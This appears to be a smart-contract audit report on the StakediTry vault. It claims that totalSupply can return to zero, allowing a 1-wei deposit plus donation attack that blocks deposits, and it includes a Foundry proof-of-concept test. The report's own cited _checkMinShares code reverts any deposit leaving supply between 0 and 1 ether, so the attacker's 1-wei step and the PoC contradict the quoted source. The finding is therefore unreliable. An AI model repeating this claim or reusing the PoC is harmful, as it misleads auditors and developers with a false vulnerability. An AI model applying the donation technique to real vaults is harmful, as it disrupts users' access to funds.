## Title
MIN_SHARES Protection Allows totalSupply Reset to Zero Enabling Donation Attack DOS

## Summary
The `_checkMinShares()` function in StakediTry.sol incorrectly allows `totalSupply` to reach exactly 0, which resets the vault to its initial vulnerable state. [1](#0-0)  An attacker can exploit this by performing a donation attack when the vault is empty, making it economically infeasible for normal users to deposit and effectively DOS'ing the protocol.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/token/wiTRY/StakediTry.sol` - `_checkMinShares()` function (lines 228-231), called by `_withdraw()` (line 277)

**Intended Logic:** The MIN_SHARES constant is designed to prevent ERC4626 donation/inflation attacks by ensuring the vault never enters a vulnerable state where a small number of shares exist. [2](#0-1)  The protocol acknowledges "Griefing attacks around MIN_SHARES" and states it will "perform an initial deposit to offset this risk." [3](#0-2) 

**Actual Logic:** The `_checkMinShares()` function only prevents totalSupply from being greater than 0 but less than MIN_SHARES. It explicitly allows totalSupply to be exactly 0 because the condition `_totalSupply > 0` evaluates to false when totalSupply is 0. [1](#0-0)  This is confirmed by the test suite which explicitly verifies "Total supply of 0 is allowed (not in prohibited range)". [4](#0-3) 

**Exploitation Path:**
1. **Vault reaches totalSupply = 0**: This can occur through normal operations if all stakers withdraw their shares (including any initial deposit), or via the `redistributeLockedAmount()` admin function burning all shares to address(0).
2. **Attacker deposits minimal amount**: Attacker deposits 1 wei of iTRY when totalSupply = 0, receiving 1 wei of shares at 1:1 ratio (standard ERC4626 behavior on first deposit).
3. **Attacker donates large amount**: Attacker directly transfers X ether (e.g., 1,000 ether) of iTRY to the vault contract without minting shares, inflating the share price to approximately X ether per 1 wei share.
4. **DOS on normal users**: When any user attempts to deposit Y ether of iTRY:
   - Share calculation: `shares = (Y * 1 wei) / (X ether + 1 wei)`
   - If Y < X + 1, shares round down to 0
   - Transaction reverts due to `notZero(shares)` modifier in `_deposit()` [5](#0-4) 
   - Users cannot deposit unless they provide > X ether to receive even 1 wei share

**Security Property Broken:** The vault's availability and normal operation guarantees are violated. Users cannot stake iTRY tokens in the vault without depositing amounts equal to or greater than the attacker's donation, effectively making the vault unusable for its intended purpose.

## Impact Explanation
- **Affected Assets**: All user iTRY deposits to the StakediTry vault become blocked
- **Damage Severity**: Complete DOS of the staking functionality until admin intervention. If attacker donates 1,000 ether iTRY, users must deposit > 1,000 ether to receive any shares. This makes staking economically infeasible for normal users.
- **User Impact**: All users attempting to stake iTRY are affected. No funds are directly stolen, but the core protocol functionality (iTRY staking for yield) is completely disabled.

## Likelihood Explanation
- **Attacker Profile**: Any user with sufficient iTRY holdings to make the attack meaningful (donation amount determines DOS effectiveness)
- **Preconditions**: 
  - Vault totalSupply must reach exactly 0 (requires all shares to be withdrawn)
  - Attacker must have iTRY to donate (1,000+ ether for significant impact)
- **Execution Complexity**: Two simple transactions - deposit 1 wei, then transfer donation amount directly to vault
- **Frequency**: Can be exploited whenever totalSupply reaches 0. While the protocol intends to maintain an initial deposit, the code allows complete withdrawal.

## Recommendation

Modify the `_checkMinShares()` function to also prevent totalSupply from reaching 0 after the vault has been initialized: [1](#0-0) 

**Alternative Fix:** Perform a permanent initial deposit to a burn address (address(0xdead)) that can never be withdrawn, ensuring totalSupply can never reach 0 after initialization. This is a more gas-efficient solution that doesn't require checking on every withdraw.

## Proof of Concept

```solidity
// File: test/Exploit_MinSharesVaultReset.t.sol
// Run with: forge test --match-test test_VaultResetDonationAttackDOS -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/wiTRY/StakediTry.sol";
import "./mocks/MockERC20.sol";

contract Exploit_MinSharesVaultReset is Test {
    StakediTry public vault;
    MockERC20 public iTRY;
    
    address public admin;
    address public rewarder;
    address public attacker;
    address public victim;
    
    uint256 constant MIN_SHARES = 1 ether;
    
    function setUp() public {
        admin = makeAddr("admin");
        rewarder = makeAddr("rewarder");
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        
        // Deploy iTRY token
        iTRY = new MockERC20("iTRY", "iTRY");
        
        // Deploy vault
        vm.prank(admin);
        vault = new StakediTry(IERC20(address(iTRY)), rewarder, admin);
        
        // Fund attacker and victim
        iTRY.mint(attacker, 10000 ether);
        iTRY.mint(victim, 100 ether);
        
        // Approve vault
        vm.prank(attacker);
        iTRY.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        iTRY.approve(address(vault), type(uint256).max);
    }
    
    function test_VaultResetDonationAttackDOS() public {
        // SETUP: Simulate initial deposit and withdrawal to reach totalSupply = 0
        // (In practice, this could be protocol's initial deposit being withdrawn)
        vm.startPrank(attacker);
        vault.deposit(MIN_SHARES, attacker);
        assertEq(vault.totalSupply(), MIN_SHARES, "Initial deposit should mint MIN_SHARES");
        
        // Withdraw all shares - totalSupply becomes 0
        vault.redeem(MIN_SHARES, attacker, attacker);
        assertEq(vault.totalSupply(), 0, "Vulnerability: totalSupply can reach 0");
        vm.stopPrank();
        
        // EXPLOIT: Attacker performs donation attack
        vm.startPrank(attacker);
        
        // Step 1: Deposit minimal amount when totalSupply = 0
        vault.deposit(1, attacker); // Deposit 1 wei, get 1 wei shares at 1:1 ratio
        assertEq(vault.totalSupply(), 1, "Attacker has 1 wei share");
        assertEq(vault.balanceOf(attacker), 1, "Attacker owns 1 wei share");
        
        // Step 2: Donate large amount to inflate share price
        uint256 donationAmount = 1000 ether;
        iTRY.transfer(address(vault), donationAmount);
        
        // Verify share price is now massively inflated
        uint256 attackerShareValue = vault.previewRedeem(1);
        assertGt(attackerShareValue, donationAmount, "Share price inflated by donation");
        vm.stopPrank();
        
        // VERIFY: Normal users cannot deposit (DOS)
        vm.startPrank(victim);
        
        // Victim tries to deposit 10 ether (reasonable amount)
        uint256 victimDeposit = 10 ether;
        
        // Calculate shares victim would receive
        uint256 expectedShares = (victimDeposit * vault.totalSupply()) / vault.totalAssets();
        assertEq(expectedShares, 0, "Victim would receive 0 shares due to rounding");
        
        // Victim's deposit will revert due to notZero(shares) check
        vm.expectRevert(abi.encodeWithSelector(IStakediTry.InvalidAmount.selector));
        vault.deposit(victimDeposit, victim);
        
        // Even trying to deposit 100 ether fails
        vm.expectRevert(abi.encodeWithSelector(IStakediTry.InvalidAmount.selector));
        vault.deposit(100 ether, victim);
        
        vm.stopPrank();
        
        // Victim must deposit MORE than donation amount to get any shares
        // This effectively DOS's the vault for normal users
        console.log("Attack successful: Vault requires > %s ether deposit", donationAmount / 1 ether);
        console.log("Normal users cannot stake, vault is DOS'd");
    }
}
```

## Notes

This vulnerability is related to but distinct from the known issue "Griefing attacks around MIN_SHARES (protocol performs initial deposit to mitigate)". [3](#0-2)  The known issue assumes the initial deposit prevents the attack, but the code allows that initial deposit to be withdrawn, returning totalSupply to 0. The `_checkMinShares()` logic explicitly permits totalSupply = 0, as confirmed by test documentation. [6](#0-5) 

The impact is Medium severity (not High) because:
1. No direct fund theft occurs - attacker spends donation amount
2. Users' existing staked funds remain safe
3. Attack requires significant capital (donation amount)
4. Admin can recover by performing another initial deposit

However, it represents a critical availability issue that renders the vault unusable until admin intervention.

### Citations

**File:** src/token/wiTRY/StakediTry.sol (L31-32)
```text
    /// @notice Minimum non-zero shares amount to prevent donation attack
    uint256 private constant MIN_SHARES = 1 ether;
```

**File:** src/token/wiTRY/StakediTry.sol (L228-231)
```text
    function _checkMinShares() internal view {
        uint256 _totalSupply = totalSupply();
        if (_totalSupply > 0 && _totalSupply < MIN_SHARES) revert MinSharesViolation();
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L240-252)
```text
    function _deposit(address caller, address receiver, uint256 assets, uint256 shares)
        internal
        override
        nonReentrant
        notZero(assets)
        notZero(shares)
    {
        if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {
            revert OperationNotAllowed();
        }
        super._deposit(caller, receiver, assets, shares);
        _checkMinShares();
    }
```

**File:** README.md (L36-36)
```markdown
- Griefing attacks around the `MIN_SHARES` variable of the ERC2646 vault: The protocol will perform an initial deposit to offset this risk. 
```

**File:** test/StakediTry.redistributeLockedAmount.t.sol (L187-196)
```text
    function test_redistributeLockedAmount_toZeroAddress_fullBurnAllowed() public {
        // Only restricted user has shares
        _depositAsRestrictedUser(100e18);

        vm.prank(admin);
        stakediTry.redistributeLockedAmount(restrictedUser, address(0));

        // Total supply of 0 is allowed (not in prohibited range)
        assertEq(stakediTry.totalSupply(), 0, "Total supply should be 0");
    }
```
